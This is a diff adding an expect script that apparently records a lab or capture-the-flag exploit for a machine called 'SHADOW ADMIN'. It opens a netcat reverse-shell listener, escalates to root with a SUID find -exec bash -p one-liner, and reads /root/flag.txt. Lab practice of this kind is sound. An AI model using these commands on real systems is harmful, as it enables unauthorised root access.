@@ -1,0 +1,31 @@
+set timeout 40
+log_file -a "captures/05_revshell.txt"
+spawn bash --noprofile --rcfile "/home/kali/Downloads/Labs/Dificil/SHADOW ADMIN/.shadowrc" -i
+expect -re {SHADOW ADMIN\$ $}
+send -- "nc -lvnp 4444\r"
+expect {
+    -re {connect to} {}
+    timeout { puts "NO_CONNECTION"; exit 1 }
+}
+sleep 2
+send -- "id\r"
+sleep 1
+send -- "hostname; uname -a\r"
+sleep 1
+send -- "ls -la /root 2>&1\r"
+sleep 1
+send -- "/usr/bin/find . -exec /bin/bash -p \\; -quit\r"
+sleep 2
+send -- "id\r"
+sleep 1
+send -- "export PS1='root@shadowadmin:/# '\r"
+sleep 1
+send -- "cat /root/flag.txt\r"
+sleep 2
+send -- "exit\r"
+sleep 1
+send -- "exit\r"
+sleep 1
+send -- "exit\r"
+expect eof
+log_file
